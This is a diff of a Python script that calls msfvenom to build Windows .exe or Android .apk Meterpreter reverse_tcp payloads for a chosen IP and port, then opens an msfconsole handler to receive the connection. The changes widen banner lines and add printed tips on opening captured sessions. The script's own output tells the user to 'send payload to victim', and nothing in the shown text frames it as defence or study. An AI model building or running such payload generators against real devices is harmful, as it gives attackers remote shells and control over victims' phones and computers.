@@ -28,11 +28,15 @@ if payload == "windows":
     os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe > "+name+".exe" )
 elif payload == "android":
       os.system("msfvenom -p android/meterpreter/reverse_tcp ""LHOST="+ip+" LPORT="+port+" R > "+name+".apk")
-print("------------------------------")
+print("---------------------------------")
 print("payload save in payloadgen folder")
-print("------------------------------")
+print("---------------------------------")
 print("Now send payload to victim")
-print("------------------------------")
-os.system("msfconsole -q -x "'"handler -p '+payload+"/meterpreter/reverse_tcp -H $lhost "+ip+ " -P $lport "+port+'"')
+print("---------------------------------------")
+print("write sessions -i to show sessions open")
+print("-----------------------------------------------------------")
+print("write sessions -i and number of session to login in session")
+print("-----------------------------------------------------------")
 
+os.system("msfconsole -q -x "'"handler -p '+payload+"/meterpreter/reverse_tcp -H $lhost "+ip+ " -P $lport "+port+'"')
 
